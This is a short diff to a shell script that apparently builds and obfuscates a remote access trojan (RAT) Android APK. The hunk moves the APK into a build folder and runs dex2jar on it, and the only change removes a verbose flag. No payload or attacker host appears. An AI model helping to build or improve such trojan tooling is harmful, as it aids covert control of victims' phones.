@@ -151,7 +151,7 @@ echo -n "[*] Running proguard on RAT APK file..."
 mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
 mkdir -v -p $MY_PATH/libs >>$LOG_FILE 2>&1
 mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
-$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -v -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
+$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
   echo "done."
